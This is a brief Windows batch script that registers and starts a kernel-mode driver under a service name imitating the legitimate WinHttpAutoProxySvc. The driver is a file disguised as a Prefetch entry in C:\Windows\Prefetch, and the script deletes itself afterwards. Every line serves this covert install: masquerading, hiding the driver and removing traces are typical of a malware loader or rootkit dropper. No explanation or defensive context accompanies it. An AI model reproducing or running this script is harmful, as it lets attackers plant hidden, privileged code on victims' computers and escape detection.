@echo off
cd %~dp0
sc create WinHttpAutoProxySvc45_c binpath=C:\Windows\Prefetch\CMD.EXE-AEH933D0.pf type=kernel
sc start WinHttpAutoProxySvc45_c
del "%~f0"